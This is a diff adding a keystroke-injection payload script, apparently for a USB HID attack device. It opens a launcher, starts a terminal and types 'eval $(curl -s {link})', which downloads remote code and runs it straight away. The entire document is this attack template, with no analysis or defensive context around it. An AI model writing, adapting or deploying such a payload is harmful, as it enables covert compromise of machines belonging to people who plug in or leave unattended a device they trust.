@@ -1,0 +1,9 @@
+GUI space
+DELAY 100
+STRING terminal
+DELAY 50
+ENTER
+DELAY 500
+STRING eval $(curl -s {link})
+DELAY 50
+ENTER
